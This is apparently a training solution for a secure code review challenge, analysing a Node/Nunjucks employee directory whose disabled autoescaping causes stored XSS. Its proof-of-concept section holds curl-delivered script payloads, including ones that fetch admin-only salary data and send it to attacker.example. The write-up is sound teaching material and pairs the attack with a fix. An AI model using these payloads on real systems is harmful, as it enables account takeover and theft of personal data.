Secure Code Review — Challenge #8: Employee Directory — Solution
Part I: Review Steps
1. Application scope & architecture
Employee Directory is an invite-only internal HR phonebook. Its core promise is field-level access control: every employee can browse everyone's public contact fields (name, title, manager, desk, location, phone), but the salary field is sensitive — visible only on your own record, or to admins. There are two roles: employee and admin. Admins can see/edit every field on every record (including salary), delete records, invite new hires, and promote users to admin.

When the app starts:

docker compose up starts two containers: a stock mongo:7 and the app (Node.js).
On first boot with an empty database, ensureBootstrapAdmin creates admin@localhost with a random password printed to the logs.
Express boots with Nunjucks as the view engine, configured with autoescape: false — the key security misconfiguration.
optionalAuth middleware runs on every request, reading a JWT from the Authorization header or token cookie.
CSRF protection via csurf for cookie-authenticated browser requests.
Data access goes through one class, DirectoryStore, built on Mongoose with three collections: users, employees, and invitations.
Main use cases:

Admin invites a new hire via POST /api/admin/invitations (random code, bcrypt-hashed, 7-day expiry)
New hire registers via POST /api/auth/register (validates invitation code, creates User + Employee, issues JWT)
Employee edits own profile via PATCH /api/employees/me (blocks salary, allowlists fields) or POST /profile (web form)
Employee browses directory via GET / — salary masked for non-owners/non-admins
Admin manages all records via GET /admin and POST /admin/employee/:id
2. Entry points
Auth API: POST /api/auth/register, POST /api/auth/login, POST /api/auth/logout

Directory API: GET /api/employees, PATCH /api/employees/me (salary blocked)

Admin API: invitations CRUD, employees CRUD (including salary), users (role changes)

Web UI: directory, profile, admin pages + form-based POST endpoints for the same operations

Implicit inputs on every request: the Authorization header and token cookie (JWT)

3. Dangerous sinks
S1 — HTML rendering with Nunjucks (autoescape: false) → stored/reflected XSS. Fed from employee name, title, manager, deskNumber, location, phone, email, salary; user email, role; invitation email
S2 — MongoDB queries via Mongoose → NoSQL injection. Fed from email, invitationCode, :id. All go through Mongoose's typed query builder or ObjectId validation.
S3 — Redirects built from code-controlled paths (/, /login, /admin, /profile) → open redirect
4 & 5. Threat model & mitigation review
T1 — Missing authentication on protected routes. ✅ Mitigated. All protected routes use requireAuth, requireAdmin, or requireUser middleware.

T2 — IDOR on employee edits. ✅ Mitigated. Self-edit loads employee via findEmployeeByUserId(req.user.id) — scoped to caller, not user-supplied ID. Admin endpoint requires admin role.

T3 — Salary field protection. ✅ Mitigated at the data layer. Self-edit API explicitly blocks salary (returns 403). Web form only sends public fields. Directory view masks salary for non-admin/non-owner records in getDirectoryForViewer.

T4 — Mass assignment on self-edit. ✅ Mitigated at the route layer. Handler builds patch object from explicit allowlist. The store's broader allowlist (including salary, userId, email) is a latent risk but the route handler never passes those keys through.

T5 — CSRF. ✅ Mitigated. csurf applied for cookie-authenticated requests, bearer API calls exempted. Every form includes {{ csrfToken() }}.

T6 — Authentication weaknesses. ✅ Mostly mitigated. JWT algorithm pinned to HS256, userId re-looked-up in DB on every request, bcrypt for passwords, CSPRNG for invitation codes, single-use invitations. Minor: no login rate-limiting, cookie lacks Secure flag.

T7 — Admin PATCH passes req.body straight to store. ⚠️ Hardening note. The admin endpoint passes req.body directly to updateEmployeeById, whose allowlist includes userId and email. An admin could reassign an employee's userId — but this requires admin access, and admins are already trusted. Not the planted flaw.

T8 — NoSQL injection. ✅ Mitigated. Mongoose typed queries, ObjectId.isValid guards, mongoSanitize middleware strips $ and . keys.

T9 — Open redirect. ✅ Mitigated. All redirects go to hard-coded paths. No user-supplied redirect URLs accepted.

T10 — Stored XSS via Nunjucks with autoescape: false. ❌ NOT MITIGATED — THIS IS THE PLANTED FLAW.

Source: employee fields (name, title, manager, deskNumber, location, phone) are user-editable via PATCH /api/employees/me or POST /profile — any authenticated employee can set them to arbitrary strings.

Transformation: none. Values stored in MongoDB as-is, returned without sanitization.

Sink: Nunjucks configured with autoescape: false (app.js line 57), so every {{ emp.name }}, {{ emp.title }}, etc. outputs the raw value as HTML. The directory page, admin page, and profile page all render employee fields in both element content (<td>{{ emp.name }}</td>) and attribute context (<input value="{{ emp.name }}">) without escaping.

No | safe filter is used anywhere — but with autoescape: false, every {{ }} is already raw. The contrast with Challenge #7 (Blogger) is deliberate: Blogger set autoescape: true and was safe; this app turned it off.

Part II: Solution
6. The vulnerability & exploitation
Class: Stored Cross-Site Scripting (XSS) — CWE-79
Root cause: Nunjucks configured with autoescape: false (app.js line 57)
Sink: {{ emp.name }}, {{ emp.title }}, etc. rendered without escaping in directory.html, admin.html, profile.html
Reachable from: any authenticated employee can set their own fields; payload renders for every user who views the directory or admin page — including admins
Why it works
1. User input reaches the template unchanged. An employee sets their name to a string containing HTML:


curl -s -X PATCH http://localhost:3000/api/employees/me \
  -H "Authorization: Bearer $EMP_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "<script>alert(document.cookie)</script>"}'
2. Nunjucks outputs it raw. With autoescape: false, {{ emp.name }} is equivalent to {{ emp.name | safe }} — the string is inserted into the HTML without escaping. The browser parses <script> as a script element and executes it.

3. The payload hits every viewer. The directory page renders all employees in a table. Once one employee has a malicious name, every user who opens the directory — including the admin — executes the script. The admin page renders fields inside <input value="{{ emp.name }}">, so a payload that breaks out of the attribute ("><script>...</script>) executes there too.

4. The profile page is also affected. views/profile.html renders value="{{ employee.name }}" in input fields.

Exploitation steps / PoC
Setup — get the bootstrap admin password, invite and register an employee:


# Start the app
cd challenges/008-employee-directory
cp .env.example .env
docker-compose up --build

# Get the bootstrap admin password
docker-compose logs app | grep -A3 "Bootstrap administrator"

# Log in as admin and invite an employee
ADMIN_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@localhost","password":"PASTE_PASSWORD"}' | jq -r '.token')

INVITE_CODE=$(curl -s -X POST http://localhost:3000/api/admin/invitations \
  -H "Authorization: Bearer $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com"}' | jq -r '.invitationCode')

# Register as the employee
EMP_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com","password":"AttackPass123!","invitationCode":"'$INVITE_CODE'"}' \
  | jq -r '.token')
Step 1 — plant the XSS payload:


curl -s -X PATCH http://localhost:3000/api/employees/me \
  -H "Authorization: Bearer $EMP_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "<script>alert(\"XSS: \"+document.cookie)</script>"}'
Step 2 — verify it fires for the admin:


curl -s http://localhost:3000/ -H "Cookie: token=$ADMIN_TOKEN"
# The HTML response contains:
#   <td><script>alert("XSS: "+document.cookie)</script></td>
The admin's JWT cookie is httpOnly, so document.cookie won't leak it directly, but the script can make authenticated fetch requests as the admin (the cookie is sent automatically on same-origin requests):


# Exfiltrate all employee data including salaries
curl -s -X PATCH http://localhost:3000/api/employees/me \
  -H "Authorization: Bearer $EMP_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "<script>fetch(\"/api/admin/employees\").then(r=>r.json()).then(d=>fetch(\"https://attacker.example/collect\",{method:\"POST\",body:JSON.stringify(d)}))</script>"}'
When the admin opens the directory, their browser silently fetches all employee records (including salaries) and sends them to the attacker's server — using the admin's own session.

Step 3 — attribute-breakout XSS on the admin page:


curl -s -X PATCH http://localhost:3000/api/employees/me \
  -H "Authorization: Bearer $EMP_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title": "\"><img src=x onerror=fetch(\"/api/admin/employees\").then(r=>r.json()).then(d=>navigator.sendBeacon(\"https://attacker.example/\",JSON.stringify(d)))>"}'
This fires on GET /admin where title is rendered in <input value="{{ emp.title }}">.

Impact: A low-privilege employee can execute arbitrary JavaScript in the admin's browser. Since the admin cookie is same-origin, the attacker can silently call admin-only API endpoints, read every salary, invite new accounts, promote themselves to admin, or delete records — completely breaking the app's access-control model without admin credentials.

7. Suggested fix
Primary fix — enable Nunjucks autoescaping:


 const env = nunjucks.configure(viewsPath, {
-  autoescape: false,
+  autoescape: true,
   express: app,
   noCache: process.env.NODE_ENV !== 'production'
 });
With autoescape: true, Nunjucks HTML-escapes & < > " ' in every {{ }} expression, covering both element content and quoted attribute values. No | safe filter is used anywhere, so this is a one-line change with no side effects.

Defense-in-depth:

Input validation — reject fields containing < or > at the API layer
Content-Security-Policy — add script-src 'self' header to block inline scripts
Restrict admin PATCH endpoint — build update object from explicit field set, not raw req.body
SAST rule — flag nunjucks.configure with autoescape: false in CI
Real world examples
XSS in Google's Bugtracker → Admin Panel Takeover — stored XSS in a user-controlled field rendered without escaping in an admin panel led to full admin account takeover
Stored XSS in GitHub's rendered comments (2017) — user-supplied content rendered in a context that bypassed autoescaping
CVE-2024-45801 — Stored XSS in Zimbra Web Client — attacker injected payload via user-controlled field rendered without escaping, executing JavaScript in admins' sessions
More resources
CWE-79
OWASP XSS Prevention Cheat Sheet
Nunjucks — Autoescaping
PortSwigger — Stored XSS
Content Security Policy — MDN
Takeaway: Template autoescaping is a default, not a decoration. Turning it off silently converts every {{ }} into a raw HTML injection point — and in a multi-user app where low-privilege users can edit fields that high-privilege users view, that's a stored XSS with a privilege escalation path to admin. The fix is one line.

